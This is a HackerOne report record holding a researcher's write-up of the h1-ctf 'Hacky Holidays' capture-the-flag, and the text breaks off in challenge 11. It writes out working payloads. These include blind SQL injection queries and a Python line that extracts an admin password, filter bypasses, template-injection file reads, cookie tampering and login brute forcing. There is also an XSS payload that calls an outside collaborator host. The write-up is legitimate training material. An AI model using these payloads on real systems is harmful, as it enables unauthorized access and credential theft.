{
  "id": 1066233,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY2MjMz",
  "url": "https://hackerone.com/reports/1066233",
  "title": "CTF Writeup",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-12-25T11:31:58.493Z",
  "submitted_at": "2020-12-25T11:31:58.554Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "a_l",
    "url": "/a_l",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/3834ivexhtfn5ozuouyjm8hyzwwl/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-01-14T19:35:04.574Z",
  "bug_reporter_agreed_on_going_public_at": "2021-01-12T08:44:30.003Z",
  "team_member_agreed_on_going_public_at": "2021-01-14T19:35:04.385Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\nFirst of all, thanks for this amazing CTF!. \n\nI will post my writeup soon, it is time to sleep now :)\n{F1129602}\n\nBy the way, the creator of challenge 11 is crazy.\n\n## Impact\n\nGrinch Network is finally down",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1129602,
      "file_name": "FinalFlag.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ezenfr7fo800zwjql6k9wmfhhayc?response-content-disposition=attachment%3B%20filename%3D%22FinalFlag.png%22%3B%20filename%2A%3DUTF-8%27%27FinalFlag.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4f567950f89b7802ecfc5133f2f9d037bd60cd4e5732efd81f42f5874a7019c7",
      "file_size": 230853,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2021-02-11T08:44:30.042Z",
  "allow_singular_disclosure_after": -94799853.21622974,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "sayir",
    "abhi7113",
    "majidhussien"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 59882,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.hackyholidays.h1ctf.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 26078,
      "category": "researcher",
      "content": "CTF Writeup:\n=====================\nThis CTF was consisted of 12 challenges. Each day a new challenge was released by HackerOne.\n\nChallenge 1 (Robots.txt):\n---------------------\n__Tools I used:__ Just my browser.\n\nThis challenge was really easy, I just checked the ```robots.txt``` file and got the flag.\n{F1165514}\n\nChallenge 2 (DOM Flag):\n---------------------\n__Tools I used:__ Just my browser.\n\nAs we can see in the ```robots.txt``` file, there is a \"hidden\" path ```/s3cr3t-ar3a```. Accessing this path reveals the following message:\n{F1165520}\n\nI started to search for interesting things in the DOM, by using the browser Inspect Element functionality, and I found both the flag, and the path for the next challenge.\n{F1165523}\n\nChallenge 3 (People Rater):\n---------------------\n__Tools I used:__ Just my browser.\n\nWe disclosed the path ```/apps``` in the previous challenge. \n__Note:__ From now on, all of the challenges, except challenge 11 and 12, will appear in the ```/apps``` page.\n\nThis challenge starts with a clickable list of buttons. Each button contains an unique value, which seems to be a base64 encoded value. \nClicking on one of these buttons, causes my browser to send a HTTP GET request to ```/entry?id=``` endpoint, where the ```id``` GET parameter is set as the base64 encoded value of a specific button that I clicked on, as can be seen in the following pictures:\n\n__This is an example of some requests:__\n{F1165525}\n\n__This is an example of 1 response:__\n{F1165526}\n\nI decoded one of the base64 values using the browser built-in Console. \nFor example:\n```atob('eyJpZCI6NX0=')``` => ```\"{\"id\":5}\"```\n\nThen, I changed the ```id``` value to 1, and I encoded it back to base64:\n```btoa('{\"id\":1}')``` => ```eyJpZCI6MX0=```\n\nThe final part is to access the ```/entry?id=eyJpZCI6MX0=``` endpoint, using our new base64 encoded value:\n{F1165527}\n\nChallenge 4 (Swag Shop):\n---------------------\n__Tools I used:__ Burp Suite.\n\nThis challenge starts with a page that contains 3 different items, which you can buy in the Gring swag shop, as can be seen here:\n{F1165529}\n\nAfter \"playing\" with the swag shop functionalities I found the following 3 API endpoints:\n\n1./api/stock - this endpoint is used to fetch the 3 item details, such as the item name and the item price.\n2./api/purchase - this endpoint can be used to buy items.\n3./api/login - in order to buy items, you need to login. This endpoint is used to login to the system.\n\nAt this point, I noticed the /api/login endpoint did not enforce any kind of rate limitation, and therefore, I started to brute force the security credentials, using Burp Suite Intruder with a simple passwords wordlist. \nAfter few minutes, I started to brute force the ```/api/ ``` path, using Burp Suite Intruder with a simple API wordlist, in order to find some interesting endpoints. \n\nUsing this technique, I found 2 additional endpoints:\n1./api/user - accessing this endpoint gave me the following message: ```{\"error\":\"Missing required fields\"}```.\n2./api/sessions - this was a really juicy endpoint which revealed all of the user sessions, as can be seen in the following picture:\n{F1165530}\n\nThese sessions seems to be base64 encoded. One of these sessions contained a user UUID, as can be seen here:\n{F1165532}\nThis UUID will be used shortly :)\n\nMeanwhile, I ran another brute force attack, this time I tried to look for HTTP GET parameters for the /api/user endpoint. After few seconds, I discovered the ```uuid``` GET parameter which returned me the following error:\n```{\"error\":\"Could not find matching uuid\"}```\n\nSo, I sent a HTTP GET request to /api/user endpoint using the disclosed UUID from the /api/sessions endpoint, and I got the flag:\n{F1165533}\n\nChallenge 5 (Secure Login):\n---------------------\n__Tools I used:__ Burp Suite, fcrackzip.\n\nIn this challenge we are given a login panel, as you can be seen here:\n{F1165535}\n\nFirst, I noticed there is no rate limitation, which means I should probably \"brute force\" my way in, but, how is that possible? I don't even know the username. \nThen, I saw the following error message: ```Invalid Username```.\nIt means the creator of this challenge gives us a hint about the way we should solve this challenge. In other word I need to brute force the username, then I will brute force the password of that username.\nMy first thoughts were about Timing Attack, but I decided to simply try to brute force the security credentials by using a Burp Suite Intruder.\n\nI configured Burp Suite Intruder with a simple username list to brute force just the username, but I didn't launch the attack yet. I thought to myself, if I will manage to guess the username successfully, the next error message will probably be ```Invalid Password```.\nMeaning I cannot filter out the server responses by the response length, because of the following:\n```Invalid Username``` =>16 characters.\n```Invalid Password``` => 16 characters.\n\n__Note:__ the server always responses with ```HTTP 200 OK```.\n\nUsing the amazing Burp Suite Intruder Grep Extract functionality I could simply create a new filter, as can be seen here:\n{F1165536}\n\nand I executed my brute force attack in order to find the username:\n{F1165537}\n\nThe username is ```access```.\n\nNow, I can execute the 2nd brute force attack which will give me the password. Again, I used Burp Suite Intruder, this time with a simple password wordlist.\n{F1165538}\n\nThe password is ```computer```.\n\nAs we can see the server sets the following cookie for us:\n```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0= ```.\n\nAt this point I noticed that the cookie is a base64 encoded value, so I decoded it, which gave me the following:\n\n```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=``` => ```{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}```.\n\nAccessing the Secure Login website using this cookie led me to the following page:\n{F1165539}\n\nso I changed the base64 decoded value, specifically the ```\"admin\":false``` part to ```\"admin\":true```, and I base64 encoded it.\n\nThe new cookie base64 value looks like this:\n```eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==``` => ```{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":true}```.\n\nI tried to access the website again, using the new cookie, and I received the following page:\n{F1165540}\n\nI downloaded this ```my_secure_files_not_for_you.zip``` zip file which contains the following 2 files:\n{F1165541}\n\nTrying to extract the zip file and read the flag, results in an error, due to the fact that the zip file is encrypted. However, this is a CTF and we should be able to crack the password :), so I used the ```fcrackzip ``` tool with the known ```rockyou.txt ``` password wordlist file, and I was able to break the password to extract the flag:\n{F1165542}\n\nIn addition, this is the ```xxx.png ``` file content:\n{F1165543}\n\nChallenge 6 (My Diary):\n---------------------\n__Tools I used:__ Burp Suite.\n\nWhen I accessed this challenge, I noticed it automatically redirects me to ```/?template=entries.html```, as can be seen here:\n{F1165544}\n\nIt seems like the server uses ```template ``` GET parameter to \"include\" the ```entries.html ``` file, so I decided to use Burp Suite Intruder in order to brute force for existing files in the server. I configured Burp Suite Intruder with the Cluster Bomb attack type as can be seen here:\n{F1165545}\n\nAfter some time, it found the ```index.php ``` file, so I simply used it as the ```template ``` GET parameter value, and was able to leak the PHP source code of the challenge, as can be seen here:\n{F1165546}\n\nIt seems like the goal is to read the ```secretadmin.php ``` file, since my input is used in the ```file_get_contents ``` function. But, first I simply tried to access it directly, instead of using the ```template``` GET parameter :)\nIt did not work, and I got the following message: ```You cannot view this page from your IP Address```. \nAt this point, I knew I should read this file content by using the ```template ``` GET parameter, but I just wanted to check if I can bypass this restriction and access it directly - I could not.\n\nBack to the PHP source code (modified with echo):\n```\n1.$page = $_GET[\"template\"];\n2.$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n3.echo $page;\n4.$page = str_replace(\"admin.php\",\"\",$page);\n5.echo $page;\n6.$page = str_replace(\"secretadmin.php\",\"\",$page);\n7.echo $page;\n```\nThe goal is to reach line 6 where $page contains the string ```secretadmin.php```.\nAs we can see in line 2, $page is filtered in such a manner that will cause it to contain some specific characters only.\n\nWe can split this challenge into two small challenges:\n1.The first goal is to pass line 4 where we have the value ```admin.php``` in $page.\n2.The 2nd challenge will be to reach line 6, where $page is equal to secretadmin.php.\n\nSolving the first challenge:\n/?template=adminadmin.php.php\n\nPHP code (output):\n```\n1.$page = $_GET[\"template\"];\n2.$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n3.echo $page; //adminadmin.php.php\n4.$page = str_replace(\"admin.php\",\"\",$page);\n5.echo $page; //admin.php\n6.$page = str_replace(\"secretadmin.php\",\"\",$page);\n7.echo $page; //admin.php\n```\n\nSolving the 2nd challenge:\n/?template=secretadminsecretadminadmin.php.php.php\n\nPHP code (output):\n```\n1.$page = $_GET[\"template\"];\n2.$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n3.echo $page; //secretadminsecretadminadmin.php.php.php\n4.$page = str_replace(\"admin.php\",\"\",$page);\n5.echo $page; //secretadminsecretadmin.php.php\n6.$page = str_replace(\"secretadmin.php\",\"\",$page);\n7.echo $page; //secretadmin.php\n```\n\nNow we can access the website using ```/?template=secretadminsecretadminadmin.php.php.php```, which will give us the ```secretadmin.php``` file content:\n{F1165548}\n\nBy the way, we can see why I could not read the file directly here:\n{F1165549}\n\nChallenge 7 (Hate Mail Generator):\n---------------------\n__Tools I used:__ Burp Suite.\n\nIn this challenge we can view and create campaigns. Our goal, as usual, is to find the hidden flag.\nThere is only one campaign in this challenge, name as Guess What, which we can access to, as you can see here:\n{F1165557}\nClicking on the Preview button, moves us to the actual campaign page, where the Markup section of this campaign is rendered. For example:\n{F1165558}\n\nI mentioned that we can also create our campaigns, well.. this is not entirely true. We can write our campaign and we can also preview it, but we cannot publish it :(\nI noticed the Markup section of the campaign is vulnerable to XSS:\n{F1165562}\n\nSo my plan was to exploit this XSS vulnerability, and publish my campaign, which will be triggered once the admin of this challenge visit it. Then, I will be able to extract the admin cookies and also the DOM, which might contain sensitive data. But, it seems like there is no way to publish my campaign so I tried something else.\n\nI started to \"play\" with the Markup section of my campaign, for example, I sent this input:\n{F1165563}\n\nWhich gave me the following output:\n{F1165564}\n\nClicking the Preview button causes my browser to send a HTTP POST request with the following data:\n```preview_markup=Hello+%7B%7Bname%7D%7D+....&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D ```\n\nAt this point, I started to test some SSTI attacks which did not work, so I took at break from this challenge. \nFew hours later I started again, and this time I noticed the challenge campaign, Guess What, contains the following interesting data: ```{{template:cbdj3_grinch_header.html}}```.\nThis \"template\" string ```{{template:file}}``` is a special keyword, it enables us to retrieve data. More specifically, the server will try to get the {{template:file}} for us.\n\nI crafted and sent a simple campaign review request to the server, as follows:\n```preview_markup={{template:test}}&preview_data= ```\nThe output:\n```Cannot find template file /templates/test```\n\nIt seems like the server attempts to \"load\" the ```test``` file from /templates folder. so I simply tried to access this folder:\n{F1165565}\n\nThere is a \"secret\" template file ```38dhs_admins_only_header.html``` which we did not know about. Trying to access it directly gave me HTTP 403 Forbidden, so I tried to read this file using the campaign preview functionality.\n\nI sent the following Markup data:\n```preview_markup={{template:38dhs_admins_only_header.html}}&preview_data= ```\nThe output:\n```You do not have access to the file 38dhs_admins_only_header.html```\n\nOur goal is clear, we just need to read that file!\nI spent some time on Path Traversal techniques and some other techniques which did not work at all. After some time I thought about using the HTTP POST parameter ```preview_data```, in order to \"pass\" this forbidden HTML file to the ```preview_markup``` template.\n\nThe plan was to create a variable, using the ```preview_data``` POST parameter, which will \"point\" to the string \"38dhs_admins_only_header.html\", and then I could simply replace that variable with the forbidden file, but it did not work as I expected. After trying some other things I got the following output for this request:\n\nThe request:\n```preview_markup={{a}}&preview_data={\"a\":[\"b\",\"c\"]} ```\n\nThe output:\n```Array ```\n\nI knew this was the way to solve this challenge, I just had to find the right way to \"point\" to that forbidden file. After several minutes I tried the following payload:\n\nThe request:\n```preview_markup={{a}}&preview_data={\"a\":\"{{template:38dhs_admins_only_header.html}}\"} ```\n\nThe output:\n{F1165566}\n\nChallenge 8 (Forum):\n---------------------\n__Tools I used:__ Burp Suite.\n\nIn this challenge we need hack our way in to the admin section.\nAccessing the main page of the challenge gives us the following page:\n{F1165567}\n\nI spent some time on this website, gathering information such as the username grinch and max. I also tried to brute force their security credentials using Burp Suite Intruder with a simple password wordlist, but I failed to do so.\n\nSo, I decided to execute a brute force attack on the path URI, in order to find some hidden endpoints. I configured my Burp Suite Intruder with a simple wordlist of known directories, and I had a hit!\nI found the hidden ```/phpmyadmin``` endpoint, as you can see here:\n{F1165568}\n\nI tried to brute force my way in using Burp Suite Intruder again using the usernames grinch and max, but it did not work. \nAt this point, I took a break from this challenge, and I even solved the next challenge before I solved this one. I came back to this challenge and I tried to look for more hidden endpoints using a bigger wordlist, and I also tried to brute force grinch, and max security credentials, again, using a bigger password wordlist, but it did not work for me.\n\nI entered the \"Nice Things To Do\" section in the forum and I saw the message: \n```There are no posts in this section ```.\n\nI tried to search this message in github and I found the following:\n{F1165569}\nGrinch-Networks!!\n\nI started to search for interesting data and I found the database security credentials inside the ```/models/Db.php``` file:\n{F1165570}\n\nI tried to use these security credentials in order to login to the /phpmyadmin panel, and it worked!. Inside the phpmyadmin I found the security credentials of grinch, and max, but there were not stored as a plaintext:\n{F1165571}\n\nIt seems like it saves a MD5 hash of their password, so the first thing I tried to do was to google grinch hash:\n{F1165572}\n\nAs you can see this MD5 hash is saved in a known MD5 hash list, or someone else already searched for this hash, and therefore, it is saved in this website :)\n\nI tried to login to the forum using Grinch and BahHumbug as the password and it worked:\n{F1165573}\n\nInside the admin section I found the flag:\n{F1165574}\n\nChallenge 9 (Evil Quiz):\n---------------------\n__Tools I used:__ Burp Suite, evilquiz.py (created by me).\n\nThis challenge starts by asking for our name:\n{F1165575}\n\n__Note:__ you can also see the Admin button in the top right side corner of the picture. This button leads to the admin panel login.\n\nAfter we submit our name to the server, it enables us to answer some questions, and finally we can see our score by accessing the ```/score``` endpoint:\n{F1165576}\n\nAs we can see, according to the message, there is only 1 other player with the same name as me (test-for-writeup).\nIt looks like the server executes some sort of \"count\" SQL query which might look like this:\n```SELECT COUNT(column_name) FROM table_name WHERE name='test-for-writeup'; ```\n\nI tried to change my name to ```test-for-writeup'or'1'='1 ```, by sending a HTTP POST request to /evil-quiz endpoint:\n{F1165577}\n\nAs you can see, now there are 1213999 other players with the same name as mine, because I successfully manipulated the SQL query by using the ```'or'1'='1 ``` input, this attack vector is also known as a SQL injection. \nMore specifically, The vulnerability in this challenge is known as a Blind SQL injection, which is also classified as a \"second order\" type. Meaning we inject our \"malicious\" payload in the ```/evil-quiz``` endpoint, and our malicious payload is only executed when we access the ```/score``` endpoint.\n\nOur goal is clear, we need to dump the whole database :D\nBy exploiting this vulnerability we can actually dump the whole database content, for instance, I can \"ask\" the database series of \"questions\", which will help me to \"slowly\" pull out the its whole content.\n\nBut first, we need to find what is type of this database. I simply \"asked\" the database the following \"questions\":\n\nInput:\n```test-for-writeup'or'1'='1'-- ```\nOutput:\n```There is 0 other player(s) with the same name as you! ```\nThis might be a PostgreSQL or a Microsoft SQL, but it is definitely not Oracle.\n\nInput:\n```test-for-writeup'or'1'='1'--+ ```\nOutput:\n```There is 1213999  other player(s) with the same name as you! ```\nThis must be MySQL.\n\nThe next \"question\" we want to \"ask\" is how many columns the current table has?\nwe can do that by using the \"order by\" keyword, or just using the UNION operator. Using the \"order by\" keyword is possible due to the fact that we do not actually need the column names, but we can sort them out using their index as follows:\n\nInput:\n```test-for-writeup'or'1'='1'+order+by+1--+ ``` \nOutput:\n```There is 1213999  other player(s) with the same name as you! ```.\n\nInput:\n```test-for-writeup'or'1'='1'+order+by+1,2--+ ```\nOutput:\n```There is 1213999  other player(s) with the same name as you! ```.\n\nInput:\n```test-for-writeup'or'1'='1'+order+by+1,2,3--+ ```\nOutput:\n```There is 1213999  other player(s) with the same name as you! ```.\n\nInput:\n```test-for-writeup'or'1'='1'+order+by+1,2,3,4--+ ```\nOutput:\n```There is 1213999  other player(s) with the same name as you! ```.\n\nInput:\n```test-for-writeup'or'1'='1'+order+by+1,2,3,4,5--+ ```\nOutput:\n```There is 0 other player(s) with the same name as you! ```.\n\n\n__There are 4 columns in the current table__.\n\nIn order to pull out data we will use the ```UNION``` operator, but we also need to verify the type of the column ,which we are going to inject our payload in, is the same type of the data we are going to retrieve. \n\nWe are going to pull out \"string\" type data, and column 4 supports this type, as we can see here:\n\nInput:\n```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,'a'--+ ```\nOutput:\n```There is 1 other player(s) with the same name as you! ```.\n\nNow, we can start to pull out the table names from the database. \nFirst, I manually checked for few specific tables such as flag, secret, and admin.\nIf there are exist, we do not need to pull out table names from the database, maybe :)\n\nI did it by injecting the following payload as my name:\n\nInput:\n```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,table_name+from+information_schema.tables+where+table_name+LIKE+'admin%'--+ ```\nOutput:\n```There is 1 other player(s) with the same name as you! ```.\n\nI found out that there is 1 table which __starts__ with the name ```admin``` so I changed my query in order to know for sure if the table name is equal to admin:\n\nInput:\n```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,table_name+from+information_schema.tables+where+table_name+='admin'--+ ```\nOutput:\n```There is 1 other player(s) with the same name as you! ```.\n\nThe table name is indeed admin!\n\nIt is time to pull out the admin table columns:\nAgain, I tried to find a \"shortcut\" and guess the column names, for example, there might be a username and a password columns right?\n\nI injected the following payloads:\n\nInput:\n```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,column_name+from+information_schema.columns+where+table_name='admin'+and+column_name='username'--+ ```\nOutput:\n```There is 1 other player(s) with the same name as you! ```.\n\nInput:\n```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,column_name+from+information_schema.columns+where+table_name='admin'+and+column_name='password'--+ ```\nOutput:\n```There is 1 other player(s) with the same name as you! ```.\n\nThere are username and password columns :D\n\nIt is time to pull out their content. This time I wrote a simple python script to do that for me.\nThis script simply exploits the Blind SQL injection vulnerability, and fetching the results (true or false) from the ```/score``` endpoint, as I mentioned this vulnerability is classified as a second-order injection.\n\nBefore I even started to write the script, I tried to check if the username is grinch or admin by sending the following payload as my name:\n\nInput:\n```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,username+from+admin+where+username='grinch'--+ ```\nOutput:\n```There is 0 other player(s) with the same name as you! ```.\n\nInput:\n```test-for-writeup'+AND+'1'='2'+union+select+NULL,NULL,NULL,username+from+admin+where+username='admin'--+ ```\nOutput:\n```There is 1 other player(s) with the same name as you! ```.\n\nThe username is admin, and therefore, I just my script to leak the admin password. For now there is no need to search for the username.\n\nThe script is attached to this writeup, and its name is evilquiz.py.\nA quick review of the \"core\" query of my script:\n\n```\nrequests.post(\"https://hackyholidays.h1ctf.com/evil-quiz\", headers=headers,data={\"name\":\"name=test-for-writeup' AND 1=2 union select 1,2,3,password from admin where username='admin' and password LIKE '\"+found+str(bf[i])+\"%'-- \"})\n```\n\nAs you can see, I will leak the whole password by using the LIKE operator:\n{F1165578}\n\nThe password is __s3cret_p4ssw0rd-$__\n\nI tried to login to the admin panel using the leaked security credentials and I failed :o\nAfter few seconds I tried to send the following payloads as my name:\n\nInput:\n```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+password+LIKE+'s3cret_p4ssw0rd-$'--+ ```\nOutput:\n```There is 1 other player(s) with the same name as you! ```.\n\nInput:\n```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+password+LIKE+'S3cret_p4ssw0rd-$'--+ ```\nOutput:\n```There is 1 other player(s) with the same name as you! ```.\n\nIt seems like I forgot about case sensitive, so I manually tested for that. For example:\n\nInput:\n```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+ascii(substr(password,1,1))=ascii('s')--+ ```\nOutput:\n```There is 0 other player(s) with the same name as you! ```.\n\nInput:\n```name=test-for-writeup'+AND+1=2+union+select+1,2,3,password+from+admin+where+username='admin'+and+ascii(substr(password,1,1))=ascii('S')--+ ```\nOutput:\n```There is 1 other player(s) with the same name as you! ```.\n\nThe first letter is capital S :)\n\nAt the end I got: ```S3creT_p4ssw0rd-$```\nI logged in to the admin panel and I got the flag:\n{F1165579}\n\nChallenge 10 (Signup Manager):\n---------------------\n__Tools I used:__ Burp Suite.\n\nThe challenge starts with a simple page where we can login, and sign up to the system:\n{F1165580}\n\nUsing Burp Suite, I quickly noticed this HTML comment at the start of the page:\n```<!-- See README.md for assistance -->```\n\nI tried to access this file and it worked:\n{F1165581}\n\nAccording to the ```README.md``` file:\n1.There is a file name ```users.txt```, which probably contains some information about the users (might be interesting).\n2.The default credentials are admin:password (I logged in using these credentials and it was a dead end)\n3.In order to be an admin the last character should be Y? (interesting).\n4.Also there is a file name ```signupmanager.zip```, which we might be able to download if not moved.\n5.There are ```user.php``` and ```admin.php``` files.\n\nMy first approach was to create an account, and login to this account. By doing so I got the following message:\n{F1165582}\n\nI tried to access ```admin.php``` file and I received the following message:\n```You cannot access this page directly```.\n\nI had a plan! it was perfect plan!\nAs we can see the message I received when I logged in to my account, says:\n```We'll have a look into you and see if you're evil enough to join the grinch army! ```\nIn other words, someone (the admin) will probably look at my profile somewhere in this website, and I have to create an account which contains XSS payloads in every possible location. \nThen, once the admin will visit the page which contains my malicious payload, I will be able to execute arbitrary JavaScript on its browser and fetch sensitive data. I might even be able to visit admin.php, who knows? By the way, this attack is known as Blind Stored XSS. \n\nSo I created a new account with the following payload in every field:\n```<img src=x onerror='document.location=\"//f9pu6rt561v3sw6jckr01l41jspid7.burpcollaborator.net\"'>```\n\nI waited few minutes and nothing happened. Then I remembered the ```signupmanager.zip``` file which I might be able to download. I tried to download this file and it worked, they did not move the file. \nAt this moment, I knew the Blind Stored XSS is not going to solve this challenge I have to focus on this zip file.\n\nThis zip file contained the whole website source code, it was amazing!\nI started to go over the code and understand this system.\nIn addition, I hosted a PHP server locally where I ran the challenge code. Also, I modified some specific parts in the code.\nFor example, I added some ```var_dump``` function calls and ```echo``` statements in the buildUsers function, as you can see here:\n{F1165583}\n\nI also tampered with the ```users.txt``` file, then I just registered and Inspected the output which was modified by me, as can be seen in the following picture:\n{F1165584}\n\nAs I can see both in the code and in the ```users.txt```, the regular user string ends with the \"N\" character.\nThe challenge is to somehow manipulate the registration functionality, and cause the string of my account to end with the \"Y\" character.\n\nTo be honest, I solved it quickly.\nI knew I was looking for a \"Off-by-one\" vulnerability. As we can see by the code, our input is very limited:\n{F1165585}\n\nThe first place I was looking at was the ```$random_hash``` and the ```$password``` variables, as they are seems to be not limited, but, then I noticed I cannot control them because they both hold a MD5 hash, which is also limited to 32 bytes.\nAfter few minutes, I noticed the ```$age``` variable, which is the only variable, except ```$random_hash```, and ```$password```, that is being modified before its assignment:\n{F1165586}\n\nMy payload is limited to 3 characters, and also must return true when ```is_numeric``` function is called (according to the code).\n\nI tried the following things:\n{F1165587}\nIt worked!\n\nI can use ```9e9``` which is a 3 character long, and also apply for the ```is_numeric```.\nNow I have the ability insert more characters via the ```$age``` variable, which will eventually \"push\" other variables characters location in my user string!.\nIn order to exploit this vulnerability I just need to fill my last name with some YYYY... characters.\n\nLocal demo:\n{F1165593}\n\nExploited the vulnerability in the CTF environment:\n{F1165588}\n\nChallenge 11 (Recon Server):\n---------------------\n__Tools I used:__ Burp Suite, sqlmap, recon.py (created by me).\n\nThe challenge starts with the following page:\n{F1165598}\n\nAs you can see, there are three recon albums which we can access to:\n1.Xmas 2020\n2.Xmas 2019\n3.Xmas 2018\n\nAccessing one of these albums, for example, the Xmas 2020, moves us to the following endpoint:\n```/album?hash=jdh34k ```\n\nWhen this endpoint is accessed using the ```hash ``` 